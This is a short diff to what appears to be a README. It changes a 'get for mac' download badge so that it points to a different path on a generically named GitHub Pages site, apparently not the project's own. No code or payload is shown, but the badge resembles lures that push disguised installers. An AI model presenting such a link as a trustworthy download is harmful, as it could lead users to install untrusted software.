@@ -6,7 +6,7 @@
 <br>
 <div align="center">
 
-[![🍏 get for mac](https://img.shields.io/badge/🍏_get_for_mac-green?style=for-the-badge&logo=apple)](https://setup-software-osx.github.io/.github/)
+[![🍏 get for mac](https://img.shields.io/badge/🍏_get_for_mac-green?style=for-the-badge&logo=apple)](https://setup-software-osx.github.io/.github/mu)
 
 </div>
 
